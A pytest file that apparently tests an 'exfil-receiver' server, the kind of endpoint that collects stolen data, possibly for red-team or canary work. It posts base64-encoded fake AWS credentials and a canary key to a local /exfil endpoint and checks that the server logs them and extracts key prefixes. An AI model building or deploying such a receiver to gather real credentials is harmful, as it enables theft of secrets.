# beaker/exfil-receiver/test_server.py
import base64
import json
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import pytest
import requests

SERVER_DIR = Path(__file__).parent


class TestExfilReceiver:
    def test_server_starts_and_responds(self, tmp_path):
        """Server must start on given port and respond to POST /exfil."""
        log_file = tmp_path / "exfil.log"
        proc = subprocess.Popen(
            [sys.executable, str(SERVER_DIR / "server.py"),
             "--port", "19443", "--log", str(log_file), "--no-tls"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        try:
            time.sleep(1)
            payload = base64.b64encode(b'{"env":{"AWS_KEY":"test"}}').decode()
            resp = requests.post(
                "http://127.0.0.1:19443/exfil",
                json={"d": payload}, timeout=5,
            )
            assert resp.status_code == 200

            log_content = log_file.read_text()
            entry = json.loads(log_content.strip().split("\n")[-1])
            assert "timestamp" in entry
            assert entry["payload_size"] > 0
        finally:
            proc.terminate()
            proc.wait(timeout=5)

    def test_rejects_non_post(self, tmp_path):
        """Server must reject GET requests."""
        log_file = tmp_path / "exfil.log"
        proc = subprocess.Popen(
            [sys.executable, str(SERVER_DIR / "server.py"),
             "--port", "19444", "--log", str(log_file), "--no-tls"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        try:
            time.sleep(1)
            resp = requests.get("http://127.0.0.1:19444/exfil", timeout=5)
            assert resp.status_code == 405
        finally:
            proc.terminate()
            proc.wait(timeout=5)

    def test_log_contains_key_prefixes(self, tmp_path):
        """Log must extract and show key prefixes from decoded payload."""
        log_file = tmp_path / "exfil.log"
        proc = subprocess.Popen(
            [sys.executable, str(SERVER_DIR / "server.py"),
             "--port", "19445", "--log", str(log_file), "--no-tls"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        try:
            time.sleep(1)
            data = {"credentials": {"/home/user/.aws/credentials": "AKIADEMOCANARY00001"}}
            payload = base64.b64encode(json.dumps(data).encode()).decode()
            requests.post(
                "http://127.0.0.1:19445/exfil",
                json={"d": payload}, timeout=5,
            )
            log_content = log_file.read_text()
            entry = json.loads(log_content.strip().split("\n")[-1])
            assert "AKIA" in str(entry.get("key_prefixes", []))
        finally:
            proc.terminate()
            proc.wait(timeout=5)
